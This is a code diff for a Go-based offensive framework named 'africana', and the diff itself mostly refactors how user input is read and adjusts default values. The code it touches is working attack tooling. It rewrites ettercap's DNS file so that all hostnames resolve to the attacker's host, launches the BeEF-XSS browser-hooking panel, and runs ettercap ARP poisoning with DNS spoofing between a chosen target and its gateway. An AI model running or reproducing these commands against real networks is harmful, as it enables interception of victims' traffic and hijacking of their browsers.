@@ -6,7 +6,6 @@ import (
     "utils"
     "menus"
     "bufio"
-    //"banners"
     "strings"
     "os/exec"
     "bcolors"
@@ -22,6 +21,7 @@ var (
     userName    string
     userPass    string
     userIface   string
+    reader = bufio.NewReader(os.Stdin)
 )
 
 func InternalScan() {
@@ -74,7 +74,6 @@ func SmbExploit(userTarget string) {
             fmt.Println()
             fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "Smbexploit " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "LHOST " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "%s", userLhostIp + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "╰─🐼" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            reader := bufio.NewReader(os.Stdin)
             userLhost, _ := reader.ReadString('\n')
             userLhost = strings.TrimSpace(userLhost)
             if userLhost == "" {
@@ -139,7 +138,6 @@ func PacketsResponder() {
         fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
         fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "╰─🐷" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        reader := bufio.NewReader(os.Stdin)
         userIface, _ := reader.ReadString('\n')
         userIface = strings.TrimSpace(userIface)
         if userIface == "" {
@@ -209,7 +207,6 @@ func BeefEttercap(userTarget string) {
             fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
             fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
             fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            reader := bufio.NewReader(os.Stdin)
             userIface, _ := reader.ReadString('\n')
             userIface = strings.TrimSpace(userIface)
             if userIface == "" {
@@ -227,7 +224,7 @@ func BeefEttercap(userTarget string) {
             userFakeDns, _ := reader.ReadString('\n')
             userFakeDns = strings.TrimSpace(userFakeDns)
             if userFakeDns == "" {
-                userFakeDns = "* A 0.0.0.0"
+                userFakeDns = "0.0.0.0"
             }
             filePathO := "/etc/ettercap/etter.conf.bak_africana"
             if _, err := os.Stat(filePathO); os.IsNotExist(err) {
@@ -247,7 +244,7 @@ func BeefEttercap(userTarget string) {
             filePathT := "/etc/ettercap/etter.dns.bak_africana"
             if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                 subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n %s%s%s%s", "* ", userFakeDns, " A ", userLhost)
+                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s%s", "*", userFakeDns, " A ", userLhost)
                 filesToReplacements := map[string]map[string]string{
                     "/etc/ettercap/etter.dns": {
                         `# vim:ts=8:noexpandtab`: newString,
@@ -259,7 +256,7 @@ func BeefEttercap(userTarget string) {
             if err != nil {
                 panic(err)
             }
-            fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -T -Q -i %s -P dns_spoof -M ARP //%s// //%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
+            fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -T -i %s -P dns_spoof -M ARP //%s// //%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
             subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     case "2":
         filePath := "/etc/beef-xss/config.yaml.bak_africana"
@@ -292,7 +289,6 @@ func BeefEttercap(userTarget string) {
             fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
             fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
             fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            reader := bufio.NewReader(os.Stdin)
             userIface, _ := reader.ReadString('\n')
             userIface = strings.TrimSpace(userIface)
             if userIface == "" {
@@ -310,7 +306,7 @@ func BeefEttercap(userTarget string) {
             userFakeDns, _ := reader.ReadString('\n')
             userFakeDns = strings.TrimSpace(userFakeDns)
             if userFakeDns == "" {
-                userFakeDns = "* A 0.0.0.0"
+                userFakeDns = "0.0.0.0"
             }
             filePathO := "/etc/ettercap/etter.conf.bak_africana"
             if _, err := os.Stat(filePathO); os.IsNotExist(err) {
@@ -330,7 +326,7 @@ func BeefEttercap(userTarget string) {
             filePathT := "/etc/ettercap/etter.dns.bak_africana"
             if _, err := os.Stat(filePathT); os.IsNotExist(err) {
                 subprocess.Popen(`cp -rf /etc/ettercap/etter.dns /etc/ettercap/etter.dns.bak_africana`)
-                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n %s%s%s%s", "* ", userFakeDns, " AAAA :: ", userLhost)
+                newString  := fmt.Sprintf("# vim:ts=8:noexpandtab\n\n%s%s%s%s", "*", userFakeDns, " A ", userLhost)
                 filesToReplacements := map[string]map[string]string{
                     "/etc/ettercap/etter.dns": {
                         `# vim:ts=8:noexpandtab`: newString,
@@ -342,7 +338,7 @@ func BeefEttercap(userTarget string) {
             if err != nil {
                 panic(err)
             }
-            fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -T -Q -i %s -P dns_spoof -M ARP //%s// //%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
+            fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; ettercap -T -i %s -P dns_spoof -M ARP //%s// //%s//`, userLhostIp, userIface, userTarget, userGateway); fmt.Println()
             subprocess.Popen(`systemctl stop beef-xss.service; systemctl --no-pager status beef-xss; rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     default:
         fmt.Println(bcolors.BLUE + "( " + bcolors.ORANGE + "Poor choice of selection. Please select from " + bcolors.YELLOW + "> " + bcolors.BLUE + "(" + bcolors.DARKCYAN + " 0 to 2 " + bcolors.BLUE + ")" + bcolors.ENDC)
@@ -394,7 +390,6 @@ func BeefBettercap(userTarget string) {
             fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
             fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
             fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            reader := bufio.NewReader(os.Stdin)
             userIface, _ := reader.ReadString('\n')
             userIface = strings.TrimSpace(userIface)
             if userIface == "" {
@@ -444,7 +439,6 @@ func BeefBettercap(userTarget string) {
             fmt.Println(); subprocess.Popen(`ip address`); fmt.Println()
             fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework: " + bcolors.ENDC + bcolors.ITALIC + "set " + bcolors.RED + "Interface " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "eth0" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
             fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-            reader := bufio.NewReader(os.Stdin)
             userIface, _ := reader.ReadString('\n')
             userIface = strings.TrimSpace(userIface)
             if userIface == "" {
@@ -470,7 +464,6 @@ func BeefInjector(userTarget string) {
         menus.MenuThreeThree()
         fmt.Printf(bcolors.BLUE + "╭─(" + bcolors.ENDC + "africana:" + bcolors.DARKCYAN + "framework:" + bcolors.DARKGREY + bcolors.ITALIC + "BeefInject " + bcolors.PURPLE + "default " + bcolors.ENDC + "= " + bcolors.YELLOW + bcolors.ITALIC + "Ettercap" + bcolors.ENDC + bcolors.BLUE + ")\n" + bcolors.ENDC)
         fmt.Printf(bcolors.BLUE + "╰─🥩" + bcolors.GREEN + "❯ " + bcolors.ENDC)
-        reader := bufio.NewReader(os.Stdin)
         userInput, _ := reader.ReadString('\n')
         userInput = strings.TrimSpace(userInput)
         if userInput == "" {
